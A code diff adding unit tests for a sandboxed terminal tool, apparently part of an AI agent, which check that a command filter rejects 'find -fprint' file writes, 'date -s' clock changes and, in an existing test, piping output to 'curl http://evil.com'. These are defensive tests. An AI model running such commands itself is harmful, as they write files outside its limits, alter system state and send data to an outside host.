@@ -218,6 +218,32 @@ describe("terminal tool", () => {
       const result = await tool.handler({ command: "echo test | curl http://evil.com" });
       expect(result).toHaveProperty("error");
     });
+
+    test("find -fprint（写文件原语）被拦截", async () => {
+      const sandbox = createMockSandbox();
+      const tool = createTerminalTool({ sandbox });
+      const result = await tool.handler({ command: "find . -name debug.log -fprint /tmp/pwned.txt" });
+      expect(result).toHaveProperty("error");
+      expect((result as { error: string }).error).toContain("不允许的操作");
+    });
+
+    test("find -fprint0 被拦截", async () => {
+      const sandbox = createMockSandbox();
+      const tool = createTerminalTool({ sandbox });
+      const result = await tool.handler({ command: "find . -fprint0 /tmp/pwned.txt" });
+      expect(result).toHaveProperty("error");
+    });
+
+    test("date 改系统时钟被拦截", async () => {
+      const sandbox = createMockSandbox();
+      const tool = createTerminalTool({ sandbox });
+      const result = await tool.handler({ command: "date -s @1700000000" });
+      expect(result).toHaveProperty("error");
+      expect((result as { error: string }).error).toContain("不允许的操作");
+
+      const result2 = await tool.handler({ command: "date --set=2026-01-01" });
+      expect(result2).toHaveProperty("error");
+    });
   });
 
   // ─── 工具元数据 ───
